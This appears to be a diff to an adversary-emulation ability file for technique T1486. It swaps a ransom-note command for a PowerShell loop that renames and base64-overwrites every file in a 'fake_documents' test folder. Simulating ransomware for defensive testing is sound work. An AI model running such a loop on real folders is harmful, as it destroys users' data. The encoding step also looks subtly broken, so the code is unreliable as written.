@@ -1,9 +1,13 @@
 - technique_id: T1486
   executors:
   - cleanup: []
-    command: 'Set-Content -Path $env:USERPROFILE\Desktop\Read_Me.txt -Value "Send
-      me money, yeah plenty of cash, FAST";
-
+    command: '
+    $TargetFolder="$($env:USERPROFILE)\Documents\fake_documents";
+    foreach($f in Get-ChildItem $TargetFolder) { 
+      Get-Content -Path $f.fullname -TotalCount 1; 
+      Rename-Item -Path $f.fullname -NewName ($f.fullname + "Pwnd");
+      [IO.File]::WriteAllBytes(($f.fullname + "Pwnd"),([System.Convert]::ToBase64String([IO.File]::ReadAllBytes($f.fullname +"Pwnd")))); 
+      } 
       '
     code: null
     build_target: null
@@ -29,5 +33,5 @@
   name: 'PS Ransomware'
   technique_name: Malicious file
   singleton: false
-  description: Will encode files in fake_document
+  description: Will encode files in fake_documents
   id: ps_ransomware
